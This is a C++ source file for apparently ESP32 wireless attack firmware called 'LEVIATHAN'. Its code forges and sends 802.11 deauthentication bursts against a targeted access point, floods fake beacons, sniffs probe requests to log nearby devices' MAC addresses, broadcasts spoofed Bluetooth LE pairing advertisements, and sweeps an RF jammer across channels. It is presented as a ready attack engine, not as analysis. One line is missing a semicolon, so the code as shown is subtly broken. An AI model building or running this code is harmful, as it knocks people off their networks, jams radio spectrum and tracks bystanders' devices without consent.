/*
 * ======================================================================================
 * FILE: attacks.cpp
 * DESCRIPTION: Implementation of attack logic with ISR Safety & Deterministic Memory.
 * ======================================================================================
 */

#include "attacks.h"
#include "hardware.h" 
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>
#include <freertos/task.h>

// Deterministic Channel Map (North America / Europe / Most of World)
const uint8_t AttackEngine::VALID_CHANNELS[13] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};

AttackEngine* AttackEngine::instance = nullptr;

AttackEngine& AttackEngine::getInstance() {
    static AttackEngine localInstance;
    instance = &localInstance; 
    return localInstance;
}

AttackEngine::AttackEngine() 
    : currentAttack(AttackType::NONE), 
      active(false), 
      targetCh(1),
      handshakeCount(0),
      probeCount(0),
      deauthCounter(0)
{
    // [Safety] Mutex for shared resources (Config, Logs)
    mutex = xSemaphoreCreateMutex();
    
    // [Safety] Queue for passing data from ISR to Task context securely
    packetQueue = xQueueCreate(20, sizeof(PacketMsg));
    
    if (mutex == NULL || packetQueue == NULL) {
        if (ENABLE_SERIAL_LOG) Serial.println("[CRITICAL] RTOS Objects Init Failed!");
    }

    // Initialize Deauth Packet Template
    uint8_t tmpl[] = { 
        0xC0, 0x00, 0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00, 0x07, 0x00 
    };
    memcpy(deauthPacket, tmpl, 26);
    memset(targetBSSID, 0, 6);
}

void AttackEngine::init() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&AttackEngine::snifferCallback);
    
    BLEDevice::init("LEVIATHAN");
}

void AttackEngine::setTarget(const uint8_t (&bssid)[6], int channel) {
    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
        memcpy(targetBSSID, bssid, 6);
        targetCh = channel;
        xSemaphoreGive(mutex);
    }
}

void AttackEngine::setAttack(AttackType type) {
    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
        // Cleanup BLE if needed
        if(currentAttack >= AttackType::BLE_SOUR && currentAttack <= AttackType::BLE_GOOGLE) {
            stopBLE();
        }
        
        currentAttack = type;
        active = (type != AttackType::NONE);
        
        // Init BLE if needed
        if (type >= AttackType::BLE_SOUR && type <= AttackType::BLE_GOOGLE) {
            int bleType = 0; 
            if (type == AttackType::BLE_SAMS) bleType = 1;
            else if (type == AttackType::BLE_WIN) bleType = 2;
            else if (type == AttackType::BLE_GOOGLE) bleType = 3;
            startBLE(bleType);
        }
        
        // Reset Queues/Counters on mode switch
        xQueueReset(packetQueue);
        
        xSemaphoreGive(mutex);
    }
}

void AttackEngine::stopAttack() {
    setAttack(AttackType::NONE);
    Hardware::getInstance().setLed(false);
    Hardware::getInstance().getRadio().stopConstCarrier();
    Hardware::getInstance().getRadio().startListening();
}

bool AttackEngine::isAttacking() const { return active; }
AttackType AttackEngine::getCurrentAttackType() const { return currentAttack; }

// --- DATA ACCESS (Deterministic) ---

size_t AttackEngine::scanNetworks(APInfo* buffer, size_t maxCount) {
    if (!buffer || maxCount == 0) return 0;

    // [Performance] Blocking scan. In a real OS this should be async, 
    // but for this architecture we block briefly.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    
    int n = WiFi.scanNetworks(false, false, false, 100); 
    if (n < 0) return 0; // Error

    size_t count = 0;
    for(int i=0; i<n && count < maxCount; i++) {
        APInfo ap;
        ap.setSSID(WiFi.SSID(i)); 
        memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.rssi = WiFi.RSSI(i);
        ap.ch = WiFi.channel(i);
        
        // [Sanity] Filter noise
        if (ap.rssi > MIN_RSSI_THRESHOLD && ap.isSSIDMeaningful()) {
            buffer[count++] = ap; 
        }
    }
    return count;
}

size_t AttackEngine::getHandshakes(AttackLog* buffer, size_t maxCount) {
    if (xSemaphoreTake(mutex, 10)) {
        size_t toCopy = (handshakeCount < maxCount) ? handshakeCount : maxCount;
        for(size_t i=0; i<toCopy; i++) {
            buffer[i] = handshakeLogs[i];
        }
        xSemaphoreGive(mutex);
        return toCopy;
    }
    return 0;
}

size_t AttackEngine::getProbes(AttackLog* buffer, size_t maxCount) {
    if (xSemaphoreTake(mutex, 10)) {
        size_t toCopy = (probeCount < maxCount) ? probeCount : maxCount;
        for(size_t i=0; i<toCopy; i++) {
            buffer[i] = probeLogs[i];
        }
        xSemaphoreGive(mutex);
        return toCopy;
    }
    return 0;
}

int AttackEngine::getDeauthCount() { return deauthCounter; }

void AttackEngine::clearLogs() {
    if (xSemaphoreTake(mutex, portMAX_DELAY)) {
        handshakeCount = 0;
        probeCount = 0;
        deauthCounter = 0;
        xSemaphoreGive(mutex);
    }
}

// --- INTERNAL HELPERS ---

void AttackEngine::logHandshake(const char* msg) {
    if (handshakeCount < MAX_LOGS) {
        handshakeLogs[handshakeCount++].set(msg);
    } else {
        
        for(size_t i=0; i < MAX_LOGS - 1; i++) {
            handshakeLogs[i] = handshakeLogs[i+1];
        }
     
        handshakeLogs[MAX_LOGS - 1].set(msg);
    }
}

void AttackEngine::logProbe(const char* mac) {
    if (probeCount < MAX_LOGS) {
        probeLogs[probeCount++].set(mac);
    } else {
        for(size_t i=0; i < MAX_LOGS - 1; i++) {
            probeLogs[i] = probeLogs[i+1];
        }
        probeLogs[MAX_LOGS - 1].set(mac);
    }
}

// --- CORE LOGIC & ISR ---

void AttackEngine::runLoop() {
    if(!active) return;
    
    // 1. Process Packet Queue (From ISR)
    processPacketQueue();

    // 2. Handle Attack Logic
    if (xSemaphoreTake(mutex, 10)) {
        
        Hardware::getInstance().setLed(true); 

        switch(currentAttack) {
            case AttackType::DEAUTH_TARGET:
                sendDeauth();
                break;
                
            case AttackType::BEACON_LIST:
                sendBeacons(true);
                break;
                
            case AttackType::BEACON_RANDOM:
                sendBeacons(false);
                break;
                
            case AttackType::PROBE_SNIFF:
            {
                static uint8_t chIdx = 0;
                static unsigned long lastHop = 0;
                
                if (millis() - lastHop > CHANNEL_HOP_DELAY) {
                    chIdx = (chIdx + 1) % 13;
                    int nextCh = VALID_CHANNELS[chIdx]
                    if (nextCh >= 1 && nextCh <= 13) {
                        esp_wifi_set_channel(nextCh, WIFI_SECOND_CHAN_NONE);
                    }
                    lastHop = millis();
                }
            }
            break;
            
            case AttackType::RF_JAM:
                static int jamCh = 0;
                Hardware::getInstance().jamFreq(jamCh++);
                if(jamCh > 80) jamCh = 0;
                vTaskDelay(JAMMER_HOP_SPEED / portTICK_PERIOD_MS);
                break;
                
            default:
                vTaskDelay(100 / portTICK_PERIOD_MS);
                break;
        }
        xSemaphoreGive(mutex);
    } else {
         taskYIELD();
    }
}

// Consumes data securely passed from ISR
void AttackEngine::processPacketQueue() {
    PacketMsg msg;
    int processed = 0;
    while(xQueueReceive(packetQueue, &msg, 0) == pdTRUE && processed < 5) {
        processed++;
        
        if (msg.type == 1) {    
             char macStr[18];
             snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                msg.payload[10], msg.payload[11], msg.payload[12], 
                msg.payload[13], msg.payload[14], msg.payload[15]);
             
             logProbe(macStr);
        }
    }
}

void AttackEngine::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!instance) return;
    
    wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
    if (p->rx_ctrl.sig_len < 16) return;

    // 1. Deauth Detection (Atomic Counter - Safe)
    if(instance->currentAttack == AttackType::DEAUTH_DETECT) {
        if (p->payload[0] == 0xC0 || p->payload[0] == 0xA0) {
            instance->deauthCounter++;
        }
        return;
    }

    // 2. Probe Request -> Queue
    if(instance->currentAttack == AttackType::PROBE_SNIFF) {
        if (p->payload[0] == 0x40 && p->rx_ctrl.sig_len > 26) {
             PacketMsg msg;
             msg.type = 1; // Probe
             msg.len = (p->rx_ctrl.sig_len < sizeof(msg.payload)) ? p->rx_ctrl.sig_len : sizeof(msg.payload);
             msg.rssi = p->rx_ctrl.rssi;
             
             memcpy(msg.payload, p->payload, msg.len);
            
             BaseType_t xHigherPriorityTaskWoken = pdFALSE;
             if (xQueueSendFromISR(instance->packetQueue, &msg, &xHigherPriorityTaskWoken) == pdTRUE) {
                 portYIELD_FROM_ISR(xHigherPriorityTaskWoken);
             }
        }
    }
}

// --- ATTACK HELPERS ---

void AttackEngine::buildDeauthPacket() {
    memcpy(&deauthPacket[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6); 
    memcpy(&deauthPacket[10], targetBSSID, 6);
    memcpy(&deauthPacket[16], targetBSSID, 6);
}

void AttackEngine::sendDeauth() {
    buildDeauthPacket();
    esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);
    for(int i=0; i<DEAUTH_BURST_SIZE; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 26, false);
        vTaskDelay(DEAUTH_PACKET_DELAY / portTICK_PERIOD_MS); 
    }
}

void AttackEngine::sendBeacons(bool rickroll) {
    const char* lyrics[] = {"Never gonna", "give you up", "Never gonna", "let you down"};
    if(rickroll) {
        for(int i=0; i<4; i++) {
            WiFi.softAP(lyrics[i]);
            vTaskDelay(50 / portTICK_PERIOD_MS);
        }
    } else {
        char buf[32];
        snprintf(buf, sizeof(buf), "FreeWiFi_%04d", (int)random(1000, 9999));
        WiFi.softAP(buf);
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }
}

void AttackEngine::startBLE(int type) {
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData oData = BLEAdvertisementData();
    char pSour[] = {0x02,0x01,0x06,0x1A,0xFF,0x4C,0x00,0x02,0x15,0x49,0x2E,0xFC,0x01,0x55,0x66,0x77,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; 
    char pWin[]  = {0x02,0x01,0x06, 0x06,0xFF,0x06,0x00,0x03,0x00,0x80}; 
    if(type == 0) oData.addData(pSour, 25);
    else oData.addData(pWin, 10);
    pAdvertising->setAdvertisementData(oData);
    pAdvertising->start();
}

void AttackEngine::stopBLE() {
    BLEDevice::getAdvertising()->stop();
}
